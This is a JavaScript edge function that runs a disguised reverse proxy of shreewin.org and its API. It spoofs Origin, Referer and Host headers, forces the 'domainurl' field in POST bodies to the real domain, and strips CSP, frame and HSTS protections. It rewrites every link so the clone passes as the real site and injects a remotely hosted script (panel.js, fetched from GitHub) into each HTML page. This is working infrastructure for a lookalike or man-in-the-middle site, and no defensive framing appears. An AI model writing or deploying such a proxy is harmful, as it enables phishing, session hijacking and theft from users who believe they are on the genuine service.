// Vercel Edge Function — Reverse Proxy for shreewin.org
// All traffic is routed here via vercel.json rewrites.

export const config = { runtime: "edge" };

const TARGET_HOST   = "shreewin.org";
const TARGET_ORIGIN = "https://shreewin.org";
const API_ORIGIN    = "https://api.shreewinapi.com";

export default async function handler(request) {
  const url = new URL(request.url);

  // Handle CORS preflight
  if (request.method === "OPTIONS") {
    return new Response(null, {
      status: 204,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "*",
        "Access-Control-Allow-Headers": "*",
        "Access-Control-Max-Age": "86400",
      },
    });
  }

  // Serve static files using the exact links from links.dump (fetches live on the backend)
  const STATIC_FILES = {
    "/logo.png": "https://raw.githubusercontent.com/astarhuni/proxy/refs/heads/main/logo.png",
    "/panel.js": "https://raw.githubusercontent.com/astarhuni/proxy/refs/heads/main/panel.js"
  };

  if (STATIC_FILES[url.pathname]) {
    const resp = await fetch(STATIC_FILES[url.pathname], { cache: "no-store" });
    const headers = new Headers(resp.headers);
    headers.set("Access-Control-Allow-Origin", "*");
    headers.set("Cache-Control", "no-cache");
    if (url.pathname.endsWith(".js")) {
      headers.set("Content-Type", "application/javascript; charset=utf-8");
    }
    if (url.pathname.endsWith(".png")) {
      headers.set("Content-Type", "image/png");
    }
    return new Response(resp.body, { status: resp.status, headers });
  }

  // Route: /api/* → API server, everything else → target site
  const upstreamOrigin = url.pathname.startsWith("/api/") ? API_ORIGIN : TARGET_ORIGIN;
  const targetUrl = new URL(url.pathname + url.search, upstreamOrigin);

  // Forward headers, spoofing Origin/Referer/Host to match the real site
  const reqHeaders = new Headers(request.headers);
  reqHeaders.set("Host", new URL(upstreamOrigin).host);
  if (reqHeaders.has("Origin"))  reqHeaders.set("Origin", TARGET_ORIGIN);
  if (reqHeaders.has("Referer")) {
    reqHeaders.set("Referer", reqHeaders.get("Referer").replace(url.origin, TARGET_ORIGIN));
  }
  reqHeaders.delete("x-forwarded-for");
  reqHeaders.delete("x-forwarded-host");
  reqHeaders.delete("x-forwarded-proto");
  reqHeaders.delete("x-vercel-forwarded-for");
  reqHeaders.delete("x-vercel-ip-country");

  // For POST requests, parse the body and force domainurl = shreewin.org
  let body = ["GET", "HEAD"].includes(request.method) ? undefined : request.body;
  if (request.method === "POST") {
    try {
      const json = JSON.parse(await request.text());
      if (json.domainurl !== undefined) json.domainurl = TARGET_HOST;
      body = JSON.stringify(json);
      reqHeaders.set("Content-Type", "application/json");
      reqHeaders.delete("Content-Length");
    } catch (_) {
      body = request.body;
    }
  }

  // Fetch from upstream
  let upstreamResp;
  try {
    upstreamResp = await fetch(targetUrl.toString(), {
      method:   request.method,
      headers:  reqHeaders,
      body:     body,
      redirect: "manual",
    });
  } catch (err) {
    return new Response("Proxy error: " + err.message, { status: 502 });
  }

  // Rewrite redirect Location headers
  if ([301, 302, 303, 307, 308].includes(upstreamResp.status)) {
    const location = (upstreamResp.headers.get("Location") || "")
      .replace(TARGET_ORIGIN, url.origin)
      .replace(API_ORIGIN, url.origin);
    return new Response(null, {
      status: upstreamResp.status,
      headers: { "Location": location, "Access-Control-Allow-Origin": "*" },
    });
  }

  // Clean response headers
  const respHeaders = new Headers(upstreamResp.headers);
  const removeHeaders = [
    "x-frame-options",
    "content-security-policy",
    "content-security-policy-report-only",
    "strict-transport-security",
    "cross-origin-opener-policy",
    "cross-origin-embedder-policy",
    "cross-origin-resource-policy",
  ];
  for (const h of removeHeaders) respHeaders.delete(h);
  respHeaders.set("Access-Control-Allow-Origin", "*");

  const contentType = respHeaders.get("Content-Type") || "";
  const isTextContent = contentType.includes("text/html")
    || contentType.includes("javascript")
    || contentType.includes("application/javascript");

  if (isTextContent) {
    let text = await upstreamResp.text();

    // Rewrite all references to point to our proxy
    text = text.split(API_ORIGIN).join(url.origin);
    text = text.split("api.shreewinapi.com").join(url.host);
    text = text.split(TARGET_ORIGIN).join(url.origin);
    text = text.split(TARGET_HOST).join(url.host);

    if (contentType.includes("text/html")) {
      text = text.replace("</body>", `\n  <!-- Proxy injection -->\n  <script src="/panel.js"></script>\n</body>`);
    } else {
      respHeaders.set("Content-Type", "application/javascript; charset=utf-8");
    }

    // CRITICAL: We modified the body, so we must remove the old compression and length headers
    respHeaders.delete("content-encoding");
    respHeaders.delete("content-length");

    return new Response(text, { status: upstreamResp.status, headers: respHeaders });
  }

  // Stream everything else (images, fonts, JSON, etc.) unchanged
  return new Response(upstreamResp.body, { status: upstreamResp.status, headers: respHeaders });
}
